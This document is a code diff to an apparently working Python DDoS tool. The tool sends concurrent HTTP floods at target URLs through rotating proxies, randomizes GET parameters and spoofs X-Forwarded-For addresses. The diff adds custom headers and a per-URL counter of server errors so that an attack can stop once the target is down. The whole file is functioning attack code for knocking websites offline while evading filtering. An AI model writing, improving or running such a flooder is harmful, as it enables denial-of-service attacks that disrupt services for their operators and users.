@@ -1,6 +1,8 @@
 #!/usr/bin/env python
 import asyncio
+import json
 import multiprocessing
+from http import HTTPStatus
 
 import uvloop
 import logging
@@ -21,6 +23,7 @@ from aiohttp_socks import ProxyConnector
 from commons import config_logger, set_limits, load_proxies
 
 STATS = defaultdict(int)
+URL_ERRORS_COUNT = defaultdict(int)
 
 
 async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, str]):
@@ -37,10 +40,14 @@ async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, st
         async with client_session as session:
             async with session.get(url, ssl=False) as response:
                 await response.text()
+                if response.status >= HTTPStatus.INTERNAL_SERVER_ERROR:
+                    URL_ERRORS_COUNT[url] += 1
                 logging.info('Url: %s Proxy: %s Status: %s', url, proxy, response.status)
+
     except Exception as error:
         logging.warning('Url: %s Proxy: %s Error: %s', url, proxy, error)
         STATS[f'{type(error)}'] += 1
+        URL_ERRORS_COUNT[url] += 1
     else:
         STATS['success'] += 1
 
@@ -63,39 +70,50 @@ def prepare_url(url: str, with_random_get_param: bool):
     return url
 
 
-def make_headers(user_agent: str, random_xff_ip: bool) -> Dict[str, str]:
+def make_headers(user_agent: str, random_xff_ip: bool, custom_headers: str) -> Dict[str, str]:
     headers = {}
     if user_agent:
         headers['user-agent'] = user_agent
     if random_xff_ip:
         headers['x-forwarded-for'] = f'{randint(10, 250)}.{randint(0, 255)}.{randint(00, 254)}.{randint(1, 250)}'
+    if custom_headers:
+        try:
+            custom_headers_dict = json.loads(custom_headers)
+        except ValueError:
+            logging.error('Custom header not applied - incorrect json')
+        else:
+            headers.update(custom_headers_dict)
     return headers
 
 
 async def ddos(
         target_url: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]],
-        with_random_get_param: bool, user_agent: str, random_xff_ip: bool
+        with_random_get_param: bool, user_agent: str, random_xff_ip: bool, custom_headers: str, stop_attack: int
 ):
     step = 0
     while True:
         if count and step > count:
             break
+        if stop_attack and URL_ERRORS_COUNT[target_url] > stop_attack:
+            break
         step += 1
         proxy = get_proxy(proxy_iterator)
-        headers = make_headers(user_agent, random_xff_ip)
+        headers = make_headers(user_agent, random_xff_ip, custom_headers)
         await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, headers)
+
 
 
 async def amain(
         target_urls: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]],
-        with_random_get_param: bool, user_agent: str, random_xff_ip: bool
+        with_random_get_param: bool, user_agent: str, random_xff_ip: bool, custom_headers: str, stop_attack: int
 ):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
     for target_url in target_urls:
         for _ in range(concurrency):
             coroutines.append(
-                ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent, random_xff_ip)
+                ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent, random_xff_ip,
+                     custom_headers, stop_attack)
             )
     await asyncio.gather(*coroutines)
 
@@ -120,6 +138,7 @@ def process(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, with_random_get_param: bool,
         user_agent: str, verbose: bool, log_to_stdout: bool, random_xff_ip: bool,
+        custom_headers: str, stop_attack: int
 ):
     config_logger(verbose, log_to_stdout)
     uvloop.install()
@@ -130,7 +149,8 @@ def process(
         target_urls.append(target_url)
     loop = asyncio.get_event_loop()
     loop.run_until_complete(
-        amain(target_urls, timeout, concurrency, count, proxies, with_random_get_param, user_agent, random_xff_ip)
+        amain(target_urls, timeout, concurrency, count, proxies, with_random_get_param, user_agent, random_xff_ip,
+              custom_headers, stop_attack)
     )
     for key, value in STATS.items():
         if key != 'success':
@@ -152,10 +172,13 @@ def process(
 @click.option('--log-to-stdout', help='log to console', is_flag=True)
 @click.option('--restart-period', help='period in seconds to restart application (reload proxies ans targets)', type=int)
 @click.option('--random-xff-ip', help='set random ip address value for X-Forwarder-For header', is_flag=True, default=False)
+@click.option('--custom-headers', help='set custom headers as json', default='{}', type=str)
+@click.option('--stop-attack', help='stop attack when target down', type=int, default=0)
 def main(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, verbose: bool, with_random_get_param: bool,
-        user_agent: str, log_to_stdout: str, restart_period: int, random_xff_ip: bool,
+        user_agent: str, log_to_stdout: str, restart_period: int, random_xff_ip: bool, custom_headers: str,
+        stop_attack: int
 ):
     config_logger(verbose, log_to_stdout)
     if not target_urls_file and not target_url:
@@ -165,7 +188,8 @@ def main(
             target=process,
             args=(target_url, target_urls_file, proxy_url, proxy_file,
                   concurrency, count, timeout, with_random_get_param,
-                  user_agent, verbose, log_to_stdout, random_xff_ip)
+                  user_agent, verbose, log_to_stdout, random_xff_ip, custom_headers,
+                  stop_attack)
         )
         proc.start()
         proc.join(restart_period)
